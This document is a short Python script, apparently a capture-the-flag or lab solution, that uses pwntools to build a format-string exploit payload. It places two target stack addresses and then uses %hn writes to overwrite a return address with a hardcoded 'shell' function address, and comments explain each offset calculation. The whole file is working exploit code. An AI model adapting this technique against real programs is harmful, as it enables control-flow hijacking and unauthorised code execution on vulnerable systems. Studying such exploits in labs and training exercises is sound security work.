#!/usr/bin/env python 

from pwn import *

addr = 0xffffce2c
shellAddr = 0x080484cb

# First, remove the first 2 bytes by anding with 0x0000ffff
firstWrite = int(shellAddr & 0xffff)

# Now, take off the 8 bytes from the addresses at the beginning of the string
firstWrite = firstWrite - 2 * 4

# Shift off the lower 2 bytes by shifting right 16 bits
secondWrite = int(shellAddr >> 4 * 4) # Shift over 2 bytes (16 bits)

# By the second write, we have written 0x84cb bytes, so take that off 
secondWrite = secondWrite + 0x10000 - (shellAddr & 0xffff)

# Debug: The values written to the string
#print hex(firstWrite)
#print hex((secondWrite + 0x10000 - firstWrite) + firstWrite)

# Now create the output
output = ""

# Place the two addresses
output += p32(addr) + p32(addr + 2)

# Place the first write for the first address
output += "%" + str(firstWrite) +"c%5$hn"

# Place the second write for the second address
output += "%" + str(secondWrite) +"c%6$hn"

print output
